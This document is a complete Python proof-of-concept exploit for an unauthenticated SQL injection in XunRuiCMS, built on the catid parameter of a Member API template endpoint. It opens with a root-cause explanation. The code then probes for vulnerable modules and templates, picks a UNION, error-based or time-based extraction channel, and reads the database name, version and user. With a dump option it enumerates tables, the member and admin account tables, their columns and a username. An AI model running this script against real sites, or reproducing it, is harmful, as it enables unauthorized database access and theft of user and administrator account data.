#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XunRuiCMS unauthenticated SQL injection - adaptive proof of concept
===================================================================

Vulnerable endpoint
    GET /index.php?s=member&c=api&m=template&name=<TEMPLATE>&module=<MODULE>&catid=<PAYLOAD>

Root cause
    App/Member/Controllers/Api.php::template() assigns every GET parameter to
    the template engine without casting catid. A template tag such as

        {module catid=$catid order=hits num=10}

    is compiled to $this->list_tag("action=module catid=$catid ..."), and
    list_tag() extracts a where='...' fragment and concatenates it into the
    module query as raw SQL. The framework copy of the same method
    (Fcms/Control/Api/Api.php) casts catid with intval() and drops where; the
    Member copy was never given the same hardening.

Design
    No assumption is made about a particular deployment:

    * Entry discovery   - if s=member&c=api&m=template answers 404 the Member
                          controller predates template() and the host is
                          reported as not affected.
    * Module discovery  - module directory names are probed by status code.
    * Template discovery- candidates are probed with 1=1 / 1=2 and the one
                          showing a content delta is selected, instead of
                          hardcoding a template file name.
    * Extraction        - UNION echo, then an error-based boolean oracle
                          (IF(cond,1,exp(999)) -> HTTP 500), then a time-based
                          fallback. The channel is chosen at runtime because a
                          template that runs a count query before the row query
                          cannot carry a UNION branch.
    * Column count      - linear probe instead of a fixed candidate list.
    * Marker            - matched across the whole response body, not tied to
                          a template class or truncation length.
    * Schema            - table and column names are read from
                          information_schema rather than assumed.

Usage
    python poc.py --url http://TARGET              # detect + read database()
    python poc.py --url http://TARGET --discover   # show probe decisions
    python poc.py --url http://TARGET --dump       # tables and account columns

Standard library only.
"""

import argparse
import re
import statistics
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

# Template candidates: default templates plus common custom names.
TEMPLATES = [
    "list.html", "index.html", "search.html", "show.html", "page.html",
    "category.html", "about.html", "contact.html", "tag.html", "404.html",
    "comment.html", "form.html", "guestbook.html", "download.html",
    "message.html", "single.html", "news.html", "product.html",
]

# Content module directory name candidates.
MODULES = ["news", "article", "blog", "product", "download", "photo",
           "video", "case", "job", "shop", "album", "doc"]

MARK = "~XR7~"


class Ctx(object):
    def __init__(self, base, timeout=25, verbose=False):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.verbose = verbose
        self.n = 0

    def raw(self, params, timeout=None):
        url = self.base + "/index.php?" + urllib.parse.urlencode(
            params, quote_via=urllib.parse.quote)
        req = urllib.request.Request(url, headers={
            "User-Agent": UA, "Accept": "*/*", "Connection": "close"})
        t0 = time.time()
        try:
            with urllib.request.urlopen(req, timeout=timeout or self.timeout) as r:
                code, body = r.status, r.read()
        except urllib.error.HTTPError as e:
            code, body = e.code, e.read()
        except Exception:                                    # noqa: BLE001
            code, body = 0, b""
        self.n += 1
        dt = time.time() - t0
        if self.verbose:
            sys.stderr.write("[%3d] %-4s %5d %6.2fs %s\n" % (
                self.n, code, len(body), dt, str(params.get("catid"))[:70]))
        return code, body, dt


class XunRui(object):
    def __init__(self, ctx, module=None):
        self.c = ctx
        self.module = module
        self.template = None
        self.mode = None          # union / error / time
        self.ncols = None

    # -------------------------------------------------------------- probing

    def _api(self, catid, template, module=None):
        return self.c.raw({
            "s": "member", "c": "api", "m": "template",
            "name": template, "module": module or self.module, "catid": catid,
        })

    def check_entry(self):
        """Return True when the Member Api template() method exists.

        Without a name argument a live method answers {'code':1,'msg':'name...'};
        a missing method makes the controller return 404, which means the host
        runs a build older than the one that introduced template() and the
        whole injection chain is unreachable.
        """
        code, body, _ = self.c.raw({"s": "member", "c": "api", "m": "template"})
        if code == 404:
            return False
        return code == 200 and (b'"code"' in body or b"name" in body)

    def find_module(self):
        if self.module:
            return self.module
        for m in MODULES:
            code, body, _ = self._api("1", "index.html", m)
            if code == 200 and b'"code"' in body:
                if self.c.verbose:
                    sys.stderr.write("  module ok: %s\n" % m)
                self.module = m
                return m
        return None

    def find_template(self):
        """Pick the template whose {module catid=$catid} tag reaches SQL.

        A boolean pair is enough: a template that forwards catid into the
        module query returns visibly different bodies for 1=1 and 1=2, while
        templates without that tag, or tags that cast the value, do not.
        """
        scored = []
        for tpl in TEMPLATES:
            c1, b1, _ = self._api("1 where='1=1'", tpl)
            c2, b2, _ = self._api("1 where='1=2'", tpl)
            if c1 != 200:
                continue
            delta = abs(len(b1) - len(b2))
            scored.append((delta, tpl, c1, c2, len(b1), len(b2)))
            if self.c.verbose:
                sys.stderr.write("  tpl %-16s %s/%s len %6d vs %6d  d=%d\n"
                                 % (tpl, c1, c2, len(b1), len(b2), delta))
        scored.sort(reverse=True)
        if scored and scored[0][0] > 200:
            self.template = scored[0][1]
            return self.template
        return None

    def oracle_error(self, cond):
        """exp(999) overflows and the request fails; a true condition returns 200."""
        code, _, _ = self._api(
            "1 where='1=1 AND IF((%s),1,exp(999))'" % cond, self.template)
        return code == 200

    def oracle_time(self, cond, delay=0.5):
        """Derived-table form so the predicate is evaluated once, not per row."""
        catid = ("1 where='1=1 AND (SELECT 1 FROM "
                 "(SELECT IF((%s),SLEEP(%s),1))x)'" % (cond, delay))
        _, _, dt = self._api(catid, self.template)
        return dt >= delay * 1.8

    def baseline_time(self):
        samples = []
        for _ in range(3):
            _, _, dt = self._api("1", self.template)
            samples.append(dt)
        return statistics.median(samples)

    def detect_mode(self):
        # 1) UNION echo: needs a 200 response that carries the marker.
        for n in range(8, 41):
            payload = self._union(n)
            code, body, _ = self._api(payload, self.template)
            if code == 200 and MARK.encode() in body:
                self.mode, self.ncols = "union", n
                return "union"
        # 2) Error-based boolean oracle.
        if self.oracle_error("1=1") and not self.oracle_error("1=2"):
            self.mode = "error"
            return "error"
        # 3) Time-based fallback.
        self.baseline_time()
        if self.oracle_time("1=1") and not self.oracle_time("1=2"):
            self.mode = "time"
            return "time"
        return None

    # ---------------------------------------------------------------- UNION

    @staticmethod
    def _hex(s):
        return "0x" + s.encode().hex()

    def _union(self, ncols, exprs=None):
        """Build a UNION payload; exprs maps 1-based column index to SQL."""
        vals = ["1"] * ncols
        for idx, e in (exprs or {}).items():
            if 1 <= idx <= ncols:
                vals[idx - 1] = e
        return ("1 where='1=1 AND 1=2 UNION SELECT " + ",".join(vals) + " #'")

    def union_read(self, expr):
        """Place the marker on several columns; the rendered one wins."""
        for idx in (3, 6, 7, 5, 4, 8, 9, 10):
            if not self.ncols or idx > self.ncols:
                continue
            payload = self._union(self.ncols, {
                idx: "CONCAT(%s,(%s),%s)" % (self._hex(MARK), expr, self._hex(MARK))
            })
            code, body, _ = self._api(payload, self.template)
            if code != 200:
                continue
            m = re.search(
                re.escape(MARK) + r"([\s\S]{1,120}?)" + re.escape(MARK),
                body.decode("utf-8", "replace"))
            if m:
                return m.group(1)
        return None

    # ---------------------------------------------------------------- blind

    def oracle(self, cond):
        if self.mode == "error":
            return self.oracle_error(cond)
        return self.oracle_time(cond)

    def length(self, expr, hi=64):
        lo = 0
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.oracle("LENGTH((%s))>=%d" % (expr, mid)):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def char_at(self, expr, pos):
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.oracle("ASCII(SUBSTR((%s),%d,1))>=%d" % (expr, pos, mid)):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def read(self, expr, maxlen=48):
        if self.mode == "union":
            v = self.union_read(expr)
            if v is not None:
                return v
        n = min(self.length(expr), maxlen)
        if n <= 0:
            return ""
        return "".join(chr(self.char_at(expr, i)) for i in range(1, n + 1))

    # --------------------------------------------------------------- driver

    def run(self, dump=False):
        p = self.c
        print("[*] target     : %s" % p.base)

        if not self.check_entry():
            print("[-] entry missing: s=member&c=api&m=template returned 404")
            print("    the Member controller predates template(); host is not affected")
            print("    (the framework copy s=api&c=api&m=template is hardened)")
            return 3
        print("[*] entry      : reachable")

        if not self.find_module():
            print("[-] entry reachable but no module name matched (use --module)")
            return 2
        print("[*] module     : %s" % self.module)

        if not self.find_template():
            print("[-] no template forwards catid into a module tag")
            return 2
        print("[*] template   : %s" % self.template)

        mode = self.detect_mode()
        if not mode:
            print("[-] no extraction channel available")
            return 2
        print("[*] channel    : %s%s" % (
            mode, " (ncols=%d)" % self.ncols if self.ncols else ""))

        print("\n[+] vulnerable: unauthenticated SQL injection\n")
        db = self.read("SELECT database()", 32)
        print("    database()   : %s" % db)
        if not db:
            return 2
        print("    @@version    : %s" % self.read("SELECT @@version", 48))
        print("    user()       : %s" % self.read("SELECT user()", 64))

        if dump:
            print("\n[1] tables")
            for i in range(12):
                t = self.read("SELECT table_name FROM information_schema.tables "
                              "WHERE table_schema=database() ORDER BY table_name "
                              "LIMIT %d,1" % i, 40)
                if not t:
                    break
                print("    %s" % t)

            print("\n[2] account tables")
            for tbl in ("dr_member", "dr_admin"):
                exists = self.oracle(
                    "(SELECT COUNT(*) FROM information_schema.tables "
                    "WHERE table_schema=database() AND table_name=%s)>=1"
                    % self._hex(tbl))
                print("    %-12s %s" % (tbl, "present" if exists else "absent"))
                if not exists:
                    continue
                cols = []
                for i in range(10):
                    cn = self.read(
                        "SELECT column_name FROM information_schema.columns "
                        "WHERE table_schema=database() AND table_name=%s "
                        "ORDER BY ordinal_position LIMIT %d,1"
                        % (self._hex(tbl), i), 24)
                    if not cn:
                        break
                    cols.append(cn)
                print("      columns: %s" % ", ".join(cols))
                if "username" in cols:
                    u = self.read("SELECT username FROM `%s` ORDER BY 1 LIMIT 1"
                                  % tbl, 32)
                    print("      first username: %s" % u)

        print("\n[*] %d requests" % p.n)
        return 0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--module", default=None, help="skip module probing")
    ap.add_argument("--dump", action="store_true",
                    help="enumerate tables and account columns")
    ap.add_argument("--discover", action="store_true",
                    help="print probe decisions")
    ap.add_argument("--timeout", type=int, default=25)
    ap.add_argument("-v", "--verbose", action="store_true")
    a = ap.parse_args()

    ctx = Ctx(a.url, a.timeout, a.verbose or a.discover)
    return XunRui(ctx, a.module).run(a.dump)


if __name__ == "__main__":
    sys.exit(main())
